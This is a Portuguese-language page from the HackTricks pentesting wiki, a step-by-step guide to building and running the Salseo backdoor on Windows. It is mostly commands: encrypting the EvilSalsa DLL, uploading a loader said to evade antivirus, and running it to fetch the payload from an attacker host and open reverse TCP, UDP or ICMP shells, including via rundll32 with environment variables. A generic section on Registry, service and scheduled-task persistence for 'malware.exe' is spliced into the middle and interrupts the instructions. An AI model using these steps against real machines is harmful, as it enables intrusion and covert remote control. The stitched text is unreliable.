# Salseo

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Compilando os binários

Baixe o código-fonte do github e compile **EvilSalsa** e **SalseoLoader**. Você precisará do **Visual Studio** instalado para compilar o código.

Compile esses projetos para a arquitetura da máquina Windows onde você vai usá-los (se o Windows suportar x64, compile-os para essa arquitetura).

Você pode **selecionar a arquitetura** dentro do Visual Studio na **aba "Build" à esquerda** em **"Platform Target".**

(\*\*Se você não encontrar essas opções, pressione em **"Project Tab"** e depois em **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Em seguida, construa ambos os projetos (Build -> Build Solution) (Dentro dos logs aparecerá o caminho do executável):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Preparando a Backdoor

Antes de tudo, você precisará codificar o **EvilSalsa.dll**. Para fazer isso, você pode usar o script python **encrypterassembly.py** ou pode compilar o projeto **EncrypterAssembly**: 

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

### Introdução

O Windows é o sistema operacional mais utilizado no mundo, o que o torna um alvo popular para hackers. Nesta seção, discutiremos algumas técnicas de backdoor que podem ser usadas em sistemas Windows.

### Backdoors

#### Porta dos Fundos do Registro

O Registro do Windows é um banco de dados que armazena configurações e opções para o sistema operacional e para os aplicativos instalados. Uma técnica comum de backdoor é adicionar uma entrada ao Registro que execute um programa malicioso sempre que o sistema é iniciado.

Para adicionar uma entrada de Registro, use o comando `reg add` no prompt de comando. Por exemplo, o seguinte comando adiciona uma entrada de Registro que executa um programa chamado `malware.exe` sempre que o sistema é iniciado:

```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Malware" /t REG_SZ /d "C:\malware.exe" /f
```

#### Porta dos Fundos do Serviço

Os serviços do Windows são programas que são executados em segundo plano e fornecem funcionalidade para o sistema operacional e para os aplicativos instalados. Uma técnica comum de backdoor é criar um serviço que execute um programa malicioso sempre que o sistema é iniciado.

Para criar um serviço, use o comando `sc create` no prompt de comando. Por exemplo, o seguinte comando cria um serviço chamado `MalwareService` que executa um programa chamado `malware.exe` sempre que o sistema é iniciado:

```
sc create MalwareService binPath= "C:\malware.exe" start= auto DisplayName= "Malware Service"
```

#### Porta dos Fundos do Agendador de Tarefas

O Agendador de Tarefas do Windows é uma ferramenta que permite agendar a execução de programas em horários específicos ou em resposta a eventos específicos. Uma técnica comum de backdoor é criar uma tarefa agendada que execute um programa malicioso sempre que o sistema é iniciado ou em horários específicos.

Para criar uma tarefa agendada, use o comando `schtasks /create` no prompt de comando. Por exemplo, o seguinte comando cria uma tarefa agendada chamada `MalwareTask` que executa um programa chamado `malware.exe` sempre que o sistema é iniciado:

```
schtasks /create /tn "MalwareTask" /tr "C:\malware.exe" /sc onstart /ru SYSTEM
```

### Conclusão

Existem muitas técnicas de backdoor que podem ser usadas em sistemas Windows. É importante que os administradores de sistemas estejam cientes dessas técnicas e tomem medidas para proteger seus sistemas contra elas.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, agora você tem tudo o que precisa para executar todo o processo Salseo: o **EvilDalsa.dll codificado** e o **binário do SalseoLoader.**

**Faça o upload do binário SalseoLoader.exe na máquina. Eles não devem ser detectados por nenhum AV...**

## **Executando a backdoor**

### **Obtendo um shell reverso TCP (baixando o dll codificado através do HTTP)**

Lembre-se de iniciar um nc como ouvinte de shell reverso e um servidor HTTP para servir o evilsalsa codificado.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obtendo um shell reverso UDP (baixando dll codificada através do SMB)**

Lembre-se de iniciar um nc como ouvinte de shell reverso e um servidor SMB para servir o evilsalsa codificado (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obtendo um shell reverso ICMP (dll codificada já presente na vítima)**

**Desta vez, você precisa de uma ferramenta especial no cliente para receber o shell reverso. Baixe:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Desativando Respostas ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Executando o cliente:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro da vítima, vamos executar o salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilando o SalseoLoader como DLL exportando função principal

Abra o projeto SalseoLoader usando o Visual Studio.

### Adicione antes da função principal: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1).png>)

### Instale o DllExport para este projeto

#### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)

#### **Procure pelo pacote DllExport (usando a guia Procurar), e pressione Instalar (e aceite o popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1).png>)

Na pasta do seu projeto aparecerão os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**

### **D**esinstale o DllExport

Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)

![](<../.gitbook/assets/image (5) (1) (1) (2).png>)

### **Saia do Visual Studio e execute DllExport\_configure**

Apenas **saia** do Visual Studio

Em seguida, vá para a sua pasta **SalseoLoader** e **execute DllExport\_Configure.bat**

Selecione **x64** (se você for usá-lo dentro de uma caixa x64, esse foi o meu caso), selecione **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) e pressione **Aplicar**

![](<../.gitbook/assets/image (7) (1) (1) (1).png>)

### **Abra o projeto novamente com o Visual Studio**

**\[DllExport]** não deve mais ser marcado como erro

![](<../.gitbook/assets/image (8) (1).png>)

### Compile a solução

Selecione **Tipo de Saída = Biblioteca de Classes** (Projeto --> Propriedades do SalseoLoader --> Aplicativo --> Tipo de Saída = Biblioteca de Classes)

![](<../.gitbook/assets/image (10) (1).png>)

Selecione a **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Compilar --> Destino da plataforma = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Para **compilar** a solução: Build --> Build Solution (Dentro do console de saída, o caminho da nova DLL aparecerá)

### Teste a DLL gerada

Copie e cole a DLL onde você deseja testá-la.

Execute:
```
rundll32.exe SalseoLoader.dll,main
```
Se nenhum erro aparecer, provavelmente você tem uma DLL funcional!!

## Obter um shell usando a DLL

Não se esqueça de usar um **servidor HTTP** e configurar um **ouvinte nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD é um acrônimo para Command Prompt, que é uma ferramenta de linha de comando usada para executar comandos no sistema operacional Windows. É uma ferramenta poderosa para hackers, pois permite executar comandos rapidamente e sem a necessidade de uma interface gráfica. Além disso, muitas ferramentas de hacking são executadas por meio do CMD, tornando-o uma ferramenta essencial para qualquer hacker.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
